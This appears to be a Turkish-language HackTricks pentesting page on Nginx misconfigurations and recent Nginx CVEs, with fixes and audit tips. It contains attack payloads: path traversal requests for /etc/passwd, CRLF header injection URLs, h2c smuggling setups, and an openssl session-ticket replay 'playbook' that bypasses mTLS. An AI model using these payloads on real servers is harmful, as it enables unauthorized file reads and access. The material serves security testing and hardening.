# Nginx

{{#include ../../banners/hacktricks-training.md}}


## Eksik root location <a href="#missing-root-location" id="missing-root-location"></a>

Nginx sunucusunu yapılandırırken, **root directive** dosyaların sunulduğu temel dizini tanımlayarak kritik bir rol oynar. Aşağıdaki örneği göz önünde bulundurun:
```bash
server {
root /etc/nginx;

location /hello.txt {
try_files $uri $uri/ =404;
proxy_pass http://127.0.0.1:8080/;
}
}
```
Bu yapılandırmada, `/etc/nginx` root dizini olarak belirlenmiştir. Bu ayar, belirtilen root dizini içindeki `/hello.txt` gibi dosyalara erişime izin verir. Ancak yalnızca belirli bir location (`/hello.txt`) tanımlı olduğu unutulmamalıdır. Root konumu için (`location / {...}`) bir yapılandırma yoktur. Bu eksiklik, root direktifinin küresel olarak uygulanması anlamına gelir; böylece kök yolu `/` için yapılan istekler `/etc/nginx` altındaki dosyalara erişebilir.

Bu yapılandırmadan kaynaklanan kritik bir güvenlik kaygısı vardır. `GET /nginx.conf` gibi basit bir `GET` isteği, `/etc/nginx/nginx.conf` konumundaki Nginx yapılandırma dosyasını sunarak hassas bilgileri ifşa edebilir. Root'u `/etc` gibi daha az hassas bir dizine ayarlamak bu riski azaltabilir, ancak yine de diğer yapılandırma dosyalarına, erişim loglarına ve HTTP temel kimlik doğrulaması için kullanılan şifrelenmiş kimlik bilgilerine istem dışı erişime izin verebilir.

## Alias LFI Yanlış Yapılandırma <a href="#alias-lfi-misconfiguration" id="alias-lfi-misconfiguration"></a>

Nginx yapılandırma dosyalarında "location" yönergelerinin dikkatle incelenmesi gerekir. Local File Inclusion (LFI) olarak bilinen bir zafiyet, aşağıdakine benzeyen bir yapılandırma aracılığıyla istemeden ortaya çıkabilir:
```
location /imgs {
alias /path/images/;
}
```
Bu yapılandırma LFI attacks açısından savunmasızdır; çünkü sunucu `/imgs../flag.txt` gibi istekleri hedeflenen dizinin dışındaki dosyalara erişim girişimi olarak yorumlayıp fiilen `/path/images/../flag.txt` olarak çözer. Bu zafiyet, saldırganların web üzerinden erişilmemesi gereken sunucunun dosya sistemindeki dosyaları elde etmesine izin verir.

Bu zafiyeti hafifletmek için yapılandırma şu şekilde ayarlanmalıdır:
```
location /imgs/ {
alias /path/images/;
}
```
Daha fazla bilgi: [https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/)

Accunetix testleri:
```
alias../ => HTTP status code 403
alias.../ => HTTP status code 404
alias../../ => HTTP status code 403
alias../../../../../../../../../../../ => HTTP status code 400
alias../ => HTTP status code 403
```
## Güvensiz yol kısıtlaması <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

Aşağıdaki sayfayı inceleyin; şu tür direktifleri atlatmayı öğrenmek için:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
{{#ref}}
../../pentesting-web/proxy-waf-protections-bypass.md
{{#endref}}

## Güvensiz değişken kullanımı / HTTP Request Splitting <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

> [!CAUTION]
> Zafiyete açık değişkenler `$uri` ve `$document_ur`i olup, bunlar `$request_uri` ile değiştirilerek düzeltilebilir.
>
> Bir regex ayrıca şu şekilde de zafiyete açık olabilir:
>
> `location ~ /docs/([^/])? { … $1 … }` - Zafiyete açık
>
> `location ~ /docs/([^/\s])? { … $1 … }` - Zafiyete açık değil (boşlukları kontrol ediyor)
>
> `location ~ /docs/(.*)? { … $1 … }` - Zafiyete açık değil

Aşağıdaki örnek, Nginx konfigürasyonunda bir zafiyeti gösterir:
```
location / {
return 302 https://example.com$uri;
}
```
HTTP isteklerinde yeni satır karakterlerini \r (Carriage Return) ve \n (Line Feed) temsil eder ve bunların URL kodlanmış halleri `%0d%0a` şeklinde gösterilir. Bu karakterleri bir isteğe (ör. `http://localhost/%0d%0aDetectify:%20clrf`) dahil etmek, yanlış yapılandırılmış bir sunucuya gönderildiğinde sunucunun `Detectify` adında yeni bir header oluşturmasına yol açar. Bu, $uri değişkeninin URL kodlanmış yeni satır karakterlerini decode etmesi nedeniyle olur ve yanıtta beklenmeyen bir header ortaya çıkar:
```
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.19.3
Content-Type: text/html
Content-Length: 145
Connection: keep-alive
Location: https://example.com/
Detectify: clrf
```
CRLF injection ve response splitting riskleri hakkında daha fazla bilgi edinin: [https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/](https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/).

Ayrıca bu teknik [**explained in this talk**](https://www.youtube.com/watch?v=gWQyWdZbdoY&list=PL0xCSYnG_iTtJe2V6PQqamBF73n7-f1Nr&index=77) içinde bazı zafiyetli örnekler ve detection mekanizmalarıyla anlatılmaktadır. Örneğin, bu yanlış yapılandırmayı blackbox perspektifinden tespit etmek için şu istekleri yapabilirsiniz:

- `https://example.com/%20X` - Any HTTP code
- `https://example.com/%20H` - 400 Bad Request

Eğer zafiyetli ise, ilki yanıt dönecektir çünkü "X" herhangi bir HTTP methodudur; ikincisi ise H geçerli bir method olmadığı için hata döndürecektir. Sunucu şu şekilde bir şey alır: `GET / H HTTP/1.1` ve bu hata tetiklenir.

Diğer tespit örnekleri şunlar olabilir:

- `http://company.tld/%20HTTP/1.1%0D%0AXXXX:%20x` - Any HTTP code
- `http://company.tld/%20HTTP/1.1%0D%0AHost:%20x` - 400 Bad Request

O konuşmada sunulan bazı zafiyetli konfigürasyonlar şunlardı:

- **`$uri`**'nin final URL'de olduğu gibi ayarlandığına dikkat edin
```
location ^~ /lite/api/ {
proxy_pass http://lite-backend$uri$is_args$args;
}
```
- Yine **`$uri`** URL içinde yer alıyor (bu sefer bir parametre içinde)
```
location ~ ^/dna/payment {
rewrite ^/dna/([^/]+) /registered/main.pl?cmd=unifiedPayment&context=$1&native_uri=$uri break;
proxy_pass http://$back;
```
- Şimdi AWS S3'te
```
location /s3/ {
proxy_pass https://company-bucket.s3.amazonaws.com$uri;
}
```
### Herhangi bir değişken

Belirli durumlarda **kullanıcı tarafından sağlanan verinin** bir **Nginx değişkeni** olarak işlem görebileceği keşfedildi. Bu davranışın nedeni tam olarak net değil; nadir olmamakla birlikte doğrulaması da kolay değil. Bu anomali, HackerOne'da yayınlanan bir güvenlik raporunda vurgulandı, rapora [here](https://hackerone.com/reports/370094) adresinden bakılabilir. Hata mesajının daha fazla incelenmesi, bu durumun [SSI filter module of Nginx's codebase](https://github.com/nginx/nginx/blob/2187586207e1465d289ae64cedc829719a048a39/src/http/modules/ngx_http_ssi_filter_module.c#L365) içinde meydana geldiğinin tespit edilmesine yol açtı; kök nedenin Server Side Includes (SSI) olduğu belirlendi.

To **detect this misconfiguration**, the following command can be executed, which involves setting a referer header to test for variable printing:
```bash
$ curl -H ‘Referer: bar’ http://localhost/foo$http_referer | grep ‘foobar’
```
Sistemler genelinde bu yanlış yapılandırma için yapılan taramalar, Nginx değişkenlerinin bir kullanıcı tarafından yazdırılabildiği birden çok örnek ortaya çıkardı. Ancak, zafiyetli örneklerin sayısındaki azalma, bu sorunu düzeltme çabalarının kısmen başarılı olduğunu gösteriyor.

### try_files ile $URI$ARGS değişkenlerini kullanma

Aşağıdaki Nginx yanlış yapılandırması bir LFI vulnerability'ye yol açabilir:
```
location / {
try_files $uri$args $uri$args/ /index.html;
}
```
Konfigürasyonumuzda, belirli bir sırayla dosyaların varlığını kontrol etmek için kullanılan `try_files` direktifi bulunur. Nginx, bulduğu ilk dosyayı sunar. `try_files` direktifinin temel sözdizimi aşağıdaki gibidir:
```
try_files file1 file2 ... fileN fallback;
```
Nginx, belirtilen sırayla her dosyanın varlığını kontrol eder. Bir dosya varsa, hemen sunulur. Belirtilen dosyaların hiçbiri yoksa, istek başka bir URI veya belirli bir hata sayfası olabilecek fallback seçeneğine iletilir.

Ancak, bu yönergede `$uri$args` değişkenlerini kullanırken, Nginx istek URI'si ile herhangi bir query string argümanının birleştirilmiş hâline uyan bir dosya aramaya çalışır. Bu yüzden bu yapılandırmayı istismar edebiliriz:
```
http {
server {
root /var/www/html/public;

location / {
try_files $uri$args $uri$args/ /index.html;
}
}
}
```
Aşağıdaki payload ile:
```
GET /?../../../../../../../../etc/passwd HTTP/1.1
Host: example.com
```
Payload'ımızı kullanarak root dizininden (Nginx yapılandırmasında tanımlı) çıkıp `/etc/passwd` dosyasını yükleyeceğiz. Debug loglarında Nginx'in dosyaları nasıl denediğini gözlemleyebiliriz:
```
...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 trying to use file: "/../../../../../../../../etc/passwd" "/var/www/html/public/../../../../../../../../etc/passwd"
2025/07/11 15:49:16 [debug] 79694#79694: *4 try file uri: "/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 http filename: "/var/www/html/public/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 HTTP/1.1 200 OK

```
Yukarıda belirtilen konfigürasyon kullanılarak Nginx'e karşı PoC:
![Example burp request](../../images/nginx_try_files.png)

## Ham backend yanıtının okunması

Nginx, backend tarafından üretilen hataları ve HTTP başlıklarını gizlemeyi amaçlayarak, `proxy_pass` aracılığıyla bunların yakalanmasına olanak sağlayan bir özellik sunar. Bu, Nginx'in backend hatalarına yanıt olarak özel hata sayfaları sunmasıyla gerçekleştirilir. Ancak Nginx geçersiz bir HTTP isteğiyle karşılaştığında sorunlar ortaya çıkar. Böyle bir istek alındığı gibi backend'e iletilir ve backend'in ham yanıtı Nginx'in müdahalesi olmadan doğrudan istemciye gönderilir.

uWSGI uygulamasını içeren bir örnek senaryoyu düşünelim:
```python
def application(environ, start_response):
start_response('500 Error', [('Content-Type', 'text/html'), ('Secret-Header', 'secret-info')])
return [b"Secret info, should not be visible!"]
```
Bunu yönetmek için Nginx yapılandırmasında belirli direktifler kullanılır:
```
http {
error_page 500 /html/error.html;
proxy_intercept_errors on;
proxy_hide_header Secret-Header;
}
```
- [**proxy_intercept_errors**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_intercept_errors): Bu direktif, Nginx'in backend yanıtları için durum kodu 300'den büyük olanlara özel bir yanıt sunmasını sağlar. Örneğin uWSGI uygulamamız için bir `500 Error` yanıtının Nginx tarafından yakalanıp işlenmesini garanti eder.
- [**proxy_hide_header**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_hide_header): Adından da anlaşılacağı üzere, bu direktif belirtilen HTTP başlıklarını istemciden gizleyerek gizliliği ve güvenliği artırır.

Geçerli bir `GET` isteği yapıldığında, Nginx onu normal şekilde işler ve gizli başlıkları ifşa etmeden standart bir hata yanıtı döner. Ancak geçersiz bir HTTP isteği bu mekanizmayı atlar ve gizli başlıklar ile hata mesajları da dahil olmak üzere ham backend yanıtlarının açığa çıkmasına neden olur.

## merge_slashes kapalı (off) olarak ayarlandığında

Varsayılan olarak, Nginx'in **`merge_slashes` direktifi** **`on`** olarak ayarlanmıştır; bu, bir URL'deki birden fazla ileri eğik çizgiyi tek bir eğik çizgiye sıkıştırır. Bu özellik, URL işlemeyi basitleştirirken, özellikle Nginx ters proxy olarak görev yaptığında arkasındaki uygulamalarda (özellikle local file inclusion - LFI'ye yatkın uygulamalarda) zafiyetleri gizleyebilir. Güvenlik uzmanları Danny Robinson ve Rotem Bar bu varsayılan davranışın potansiyel risklerini vurgulamışlardır.

Bu tür riskleri azaltmak için, bu zafiyete açık uygulamalar için `merge_slashes` direktifinin kapatılması (off) önerilir. Bu sayede Nginx isteği URL yapısını değiştirmeden uygulamaya iletir ve alttaki güvenlik sorunlarını maskelemez.

Daha fazla bilgi için bakınız [Danny Robinson and Rotem Bar](https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d).

### **Maclicious Yanıt Başlıkları**

Bu [**yazıda**](https://mizu.re/post/cors-playground) gösterildiği gibi, web sunucusundan gelen yanıtta bulunmaları durumunda Nginx proxy'nin davranışını değiştirecek bazı başlıklar vardır. Bunları [**dokümanlarda**](https://www.nginx.com/resources/wiki/start/topics/examples/x-accel/) kontrol edebilirsiniz:

- `X-Accel-Redirect`: Nginx'e isteği belirtilen bir konuma dahili olarak yönlendirmesini belirtir.
- `X-Accel-Buffering`: Nginx'in yanıtı tamponlayıp tamponlamayacağını kontrol eder.
- `X-Accel-Charset`: X-Accel-Redirect kullanıldığında yanıt için karakter kümesini ayarlar.
- `X-Accel-Expires`: X-Accel-Redirect kullanıldığında yanıtın sona erme süresini ayarlar.
- `X-Accel-Limit-Rate`: X-Accel-Redirect kullanıldığında yanıtların transfer hızını sınırlar.

Örneğin, başlık **`X-Accel-Redirect`** nginx'te dahili bir **redirect** (yönlendirme) oluşmasına neden olur. Bu yüzden nginx yapılandırmasında **`root /`** gibi bir ayar varsa ve web sunucusundan **`X-Accel-Redirect: .env`** içeren bir yanıt geliyorsa nginx **`/.env`** içeriğini gönderir (Path Traversal).

### **Map Direktifinde Varsayılan Değer**

Nginx yapılandırmasında, `map` direktifi sıklıkla yetkilendirme kontrolünde (authorization control) rol oynar. Yaygın bir hata **default** değerinin belirtilmemesidir; bu yetkisiz erişime yol açabilir. Örneğin:
```yaml
http {
map $uri $mappocallow {
/map-poc/private 0;
/map-poc/secret 0;
/map-poc/public 1;
}
}
```

```yaml
server {
location /map-poc {
if ($mappocallow = 0) {return 403;}
return 200 "Hello. It is private area: $mappocallow";
}
}
```
`default` olmadan, bir **kötü niyetli kullanıcı**, `/map-poc` içinde bir **tanımsız URI**'ye erişerek güvenliği atlatabilir. [The Nginx manual](https://nginx.org/en/docs/http/ngx_http_map_module.html) bu tür sorunları önlemek için bir **varsayılan değer** belirlemenizi önerir.

### **DNS Spoofing Zafiyeti**

Belirli koşullar altında Nginx'e karşı DNS spoofing mümkün olabilir. Eğer bir saldırgan, Nginx'in kullandığı **DNS server**'ı biliyorsa ve DNS sorgularını yakalayabiliyorsa, DNS kayıtlarını spoof edebilir. Ancak bu yöntem, Nginx DNS çözümlemesi için **localhost (127.0.0.1)** kullanacak şekilde yapılandırıldıysa etkisizdir. Nginx aşağıdaki şekilde bir DNS server belirtmeye izin verir:
```yaml
resolver 8.8.8.8;
```
### **`proxy_pass` ve `internal` Yönergeleri**

**`proxy_pass`** yönergesi, istekleri dahili ya da harici diğer sunuculara yönlendirmek için kullanılır. **`internal`** yönergesi ise belirli konumların yalnızca Nginx içinde erişilebilir olmasını sağlar. Bu yönergeler kendi başlarına zafiyet olmasalar da, yanlış yapılandırılmaları güvenlik açıklarına yol açmaması için dikkatle incelenmelidir.

## proxy_set_header Upgrade & Connection

Eğer nginx sunucusu Upgrade ve Connection başlıklarını iletecek şekilde yapılandırılmışsa, korunan/dahili uç noktalara erişmek için bir [**h2c Smuggling attack**](../../pentesting-web/h2c-smuggling.md) gerçekleştirilebilir.

> [!CAUTION]
> Bu zafiyet, bir saldırıcının **`proxy_pass` endpoint`i ile doğrudan bir bağlantı kurmasına** izin verir (`http://backend:9999` bu durumda) ve içeriği nginx tarafından kontrol edilmeyecektir.

Örnek savunmasız yapılandırma, buradan `/flag` çalmak için: [https://bishopfox.com/blog/h2c-smuggling-request](https://bishopfox.com/blog/h2c-smuggling-request)
```
server {
listen       443 ssl;
server_name  localhost;

ssl_certificate       /usr/local/nginx/conf/cert.pem;
ssl_certificate_key   /usr/local/nginx/conf/privkey.pem;

location / {
proxy_pass http://backend:9999;
proxy_http_version 1.1;
proxy_set_header Upgrade $http_upgrade;
proxy_set_header Connection $http_connection;
}

location /flag {
deny all;
}
```
> [!WARNING]
> `proxy_pass` belirli bir **path**'e, örneğin `http://backend:9999/socket.io`, işaret etse bile bağlantı `http://backend:9999` ile kurulacağını unutmayın; bu yüzden iç endpoint içindeki herhangi bir başka path ile iletişime geçebilirsiniz. Yani proxy_pass URL'sinde bir path belirtilmiş olması önemli değildir.

## HTTP/3 QUIC module remote DoS & leak (2024)

2024 boyunca Nginx, CVE-2024-31079, CVE-2024-32760, CVE-2024-34161 ve CVE-2024-35200'i açıkladı; bu CVE'ler, deneysel `ngx_http_v3_module` derlenmiş ve bir `listen ... quic` soketi açılmışsa, tek bir **hostile QUIC session**'ın worker süreçlerini çökertebileceğini veya belleği leak edebileceğini gösteriyor. Etkilenen sürümler 1.25.0–1.25.5 ve 1.26.0 iken, düzeltmeler 1.27.0/1.26.1'de yer alır; bellek açıklığı (CVE-2024-34161) ayrıca duyarlı verilerin ortaya çıkması için 4096 bayttan büyük MTU'lar gerektirir (ayrıntılar aşağıdaki 2024 nginx advisory'de).

**Recon & exploitation hints**

- HTTP/3 isteğe bağlıdır, bu yüzden `Alt-Svc: h3=":443"` yanıtlarını tarayın veya UDP/443 QUIC el sıkışmalarını brute-force yapın; doğrulandıktan sonra, worker çökmesini tetiklemek ve log leak oluşturmak için el sıkışmayı ve STREAM çerçevelerini özel `quiche-client`/`nghttp3` payload'larıyla fuzz edin.
- Hedefin desteğini hızlıca fingerprint'leyin:
```bash
nginx -V 2>&1 | grep -i http_v3
rg -n "listen .*quic" /etc/nginx/
```
## TLS oturum devam ettirme ile istemci sertifika doğrulamasının atlanması (CVE-2025-23419)

Şubat 2025 tarihli bir güvenlik bildirimi, OpenSSL ile derlenmiş nginx 1.11.4–1.27.3 sürümlerinin bir name-based virtual host'tan elde edilen **TLS 1.3 oturumunu** başka bir host içinde yeniden kullanmasına izin verdiğini açıkladı; bu yüzden sertifikasız bir host ile anlaşma yapan bir istemci ticket/PSK'i yeniden oynatarak `ssl_verify_client on;` ile korunan bir vhost'a atlayabilir ve mTLS'i tamamen atlayabilir. Hata, birden fazla virtual host aynı TLS 1.3 oturum önbelleğini ve ticket'ları paylaştığında tetiklenir (aşağıda referans verilen 2025 nginx güvenlik bildirisine bakın).

**Saldırgan playbook**
```bash
# 1. Create a TLS session on the public vhost and save the session ticket
openssl s_client -connect public.example.com:443 -sess_out ticket.pem

# 2. Replay that session ticket against the mTLS vhost before it expires
openssl s_client -connect admin.example.com:443 -sess_in ticket.pem -ign_eof
```
Hedef savunmasızsa, ikinci handshake istemci sertifikası sunulmadan tamamlanır ve korumalı konumları açığa çıkarır.

**Denetlenecekler**

- `server_name` blokları karışık şekilde yapılandırılmışsa ve `ssl_session_cache shared:SSL` ile `ssl_session_tickets on;` paylaşıyorlarsa.
- mTLS bekleyen Admin/API blokları ancak ortak session cache/ticket ayarlarını genel hostlardan devralıyorsa.
- TLS 1.3 session resumption'u küresel olarak etkinleştiren otomasyon (ör. Ansible roles) vhost izolasyonunu dikkate almadan uygulanıyorsa.

## HTTP/2 Rapid Reset dayanıklılığı (CVE-2023-44487 davranışı)

HTTP/2 Rapid Reset saldırısı (CVE-2023-44487) nginx'i hâlâ etkiler; operatörler `keepalive_requests` veya `http2_max_concurrent_streams` değerlerini varsayılanların ötesine çıkardığında: bir saldırgan tek bir HTTP/2 bağlantısı açar, binlerce stream ile doldurur, ardından hemen `RST_STREAM` frame'leri gönderir—böylece eşzamanlılık tavanına hiç ulaşılmazken CPU kapanış/temizleme mantığı üzerinde çalışmaya devam eder. Nginx varsayılanları (128 concurrent streams, 1000 keepalive requests) etki alanını küçük tutar; bu limitlerin "önemli ölçüde" yükseltilmesi, tek bir istemciden bile worker'ları kaynak kıtlığına uğratmayı triviale çevirir (aşağıda referans verilen F5 write-up'a bakın).

**Tespit ipuçları**
```bash
# Highlight risky knobs
rg -n "http2_max_concurrent_streams" /etc/nginx/
rg -n "keepalive_requests" /etc/nginx/
```
Hostların bu direktifler için olağandışı derecede yüksek değerleri açığa çıkarması onları birincil hedef haline getirir: bir HTTP/2 client, stream oluşturma ve anında `RST_STREAM` frame'leri döngüsüne girerek eşzamanlılık sınırını tetiklemeden CPU'yu meşgul tutabilir.

## Kendiniz deneyin

Detectify, Docker kullanarak bu makalede tartışılan bazı yanlış yapılandırmalarla kendi güvenlik açıkları içeren Nginx test sunucunuzu kurabileceğiniz ve bunları kendiniz bulmayı deneyebileceğiniz bir GitHub repository'si oluşturdu!

[https://github.com/detectify/vulnerable-nginx](https://github.com/detectify/vulnerable-nginx)

## Statik analiz araçları

### [GIXY](https://github.com/yandex/gixy)

Gixy, Nginx yapılandırmasını analiz etmek için bir araçtır. Gixy'nin ana hedefi güvenlik yanlış yapılandırmalarını önlemek ve kusur tespitini otomatikleştirmektir.

### [Nginxpwner](https://github.com/stark0de/nginxpwner)

Nginxpwner, yaygın Nginx yanlış yapılandırmalarını ve güvenlik açıklarını aramak için basit bir araçtır.

## Kaynaklar

- [**https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/**](https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/)
- [**http://blog.zorinaq.com/nginx-resolver-vulns/**](http://blog.zorinaq.com/nginx-resolver-vulns/)
- [**https://github.com/yandex/gixy/issues/115**](https://github.com/yandex/gixy/issues/115)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html**](https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html**](https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html)
- [**https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products**](https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products)


{{#include ../../banners/hacktricks-training.md}}
